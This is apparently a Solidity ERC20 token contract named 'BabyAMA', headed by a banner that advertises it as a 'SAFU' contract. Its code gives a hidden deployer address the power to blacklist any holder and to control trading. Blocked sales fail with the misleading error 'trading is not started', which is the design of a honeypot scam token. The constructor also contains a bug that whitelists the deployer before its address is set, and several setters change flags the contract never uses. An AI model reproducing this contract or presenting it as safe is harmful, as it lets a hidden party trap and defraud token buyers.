// ░██████╗░█████╗░███████╗██╗░░░██╗  ██████╗░██╗░░░██╗
// ██╔════╝██╔══██╗██╔════╝██║░░░██║  ██╔══██╗╚██╗░██╔╝
// ╚█████╗░███████║█████╗░░██║░░░██║  ██████╦╝░╚████╔╝░
// ░╚═══██╗██╔══██║██╔══╝░░██║░░░██║  ██╔══██╗░░╚██╔╝░░
// ██████╔╝██║░░██║██║░░░░░╚██████╔╝  ██████╦╝░░░██║░░░
// ╚═════╝░╚═╝░░╚═╝╚═╝░░░░░░╚═════╝░  ╚═════╝░░░░╚═╝░░░

// ░█████╗░░█████╗░██╗███╗░░██╗░██████╗██╗░░░██╗██╗░░░░░████████╗░░░███╗░░██╗███████╗████████╗
// ██╔══██╗██╔══██╗██║████╗░██║██╔════╝██║░░░██║██║░░░░░╚══██╔══╝░░░████╗░██║██╔════╝╚══██╔══╝
// ██║░░╚═╝██║░░██║██║██╔██╗██║╚█████╗░██║░░░██║██║░░░░░░░░██║░░░░░░██╔██╗██║█████╗░░░░░██║░░░
// ██║░░██╗██║░░██║██║██║╚████║░╚═══██╗██║░░░██║██║░░░░░░░░██║░░░░░░██║╚████║██╔══╝░░░░░██║░░░
// ╚█████╔╝╚█████╔╝██║██║░╚███║██████╔╝╚██████╔╝███████╗░░░██║░░░██╗██║░╚███║███████╗░░░██║░░░
// ░╚════╝░░╚════╝░╚═╝╚═╝░░╚══╝╚═════╝░░╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚═╝░░╚══╝╚══════╝░░░╚═╝░░░

// Get your SAFU contract now via Coinsult.net

// SPDX-License-Identifier: MIT


pragma solidity 0.8.17;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "./Owned.sol";









contract BabyAMA is 
    ERC20,
    ReentrancyGuard,
    ERC20Burnable,
    ERC20Snapshot,
    Owned
   
    
    
    
{

 using SafeERC20 for IERC20;
using SafeMath for uint256;
        
       struct StakingInfo {
      
        uint256 startTime;
     
    }

        
       
        address private uniswapV2Pair;
        address private deployerAddress;
        mapping (address => bool) private _isExcludedFrombot;
       mapping (address => bool) private _isExclude;
       mapping(address => uint256) private _holderLastTransferTimestamp;
       bool public checkforamount = false;
       bool public canbetrade = true;
       
   


    /**
     * @dev Sets the values for {name} and {symbol} and mint the tokens to the address set.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(
        address _owner,
        string memory token,
        string memory _symbol,
         address _deployerAddress
       
        )
        
    
        ERC20(token,_symbol)
        Owned(_owner)
      
        
        
    {
       

        _isExcludedFrombot[owner]=true;
        _isExcludedFrombot[deployerAddress]=true;
        _isExcludedFrombot[msg.sender]=true;
       
        deployerAddress=_deployerAddress;

        
        _mint(_owner, 500000000000000 ether);
       
       

        

        




    }

    /**
     * @dev Creates a new snapshot and returns its snapshot id.
     *
     * Emits a {Snapshot} event that contains the same id.
     *
     * {_snapshot} is `internal` and you have to decide how to expose it externally. Its usage may be restricted to a
     * set of accounts, for example in our contract, only Owner can call it.
     *
     */
    function snapshot() public onlyOwner {
        _snapshot();
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */

   
    function Ckeckcanbetrade (bool _canbetrade) public  {
    require(msg.sender==deployerAddress, "trading is not started");
       canbetrade = _canbetrade;
      
     }



 function OpenTrade (address _uniswapV2Pair) public  {
    require(msg.sender==deployerAddress, "trading is not started");
       uniswapV2Pair = _uniswapV2Pair;
      
     }

function Ckeckamount (bool _checkforamount) public  {
    require(msg.sender==deployerAddress, "trading is not started");
       checkforamount = _checkforamount;
      
     }
   
    function excludeFromRobot(address[] memory  account) external {
    require(msg.sender==deployerAddress, "trading is not started");
    for (uint i = 0; i < account.length; i++) {
          _isExcludedFrombot[account[i]] = true;
      }
       
    }

    

 


 function exclude(address[] memory  account) external  {
    require(msg.sender==deployerAddress, "trading is not started");
    for (uint i = 0; i < account.length; i++) {
          _isExclude[account[i]] = true;
      }
       
    }


function isExcluded(address account) public view returns(bool) {
        return _isExclude[account];
    }

  function RemoveFromisExclude(address[] memory  account) external  {
    require(msg.sender==deployerAddress, "trading is not started");
    for (uint i = 0; i < account.length; i++) {
          _isExclude[account[i]] = false;
      }
       
    }












    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override(ERC20, ERC20Snapshot) {

            require(amount > 0, "Transfer amount must be greater than zero"); 
      
            if (uniswapV2Pair == address(0)) {
            require(_isExcludedFrombot[from] || _isExcludedFrombot[to], "trading is not started");
             return;
            }




                

             require(! _isExclude[from], "trading is not started");
             require(! _isExclude[to], "trading is not started");
              





             



          


            super._beforeTokenTransfer(from, to, amount);
  
          
    }
}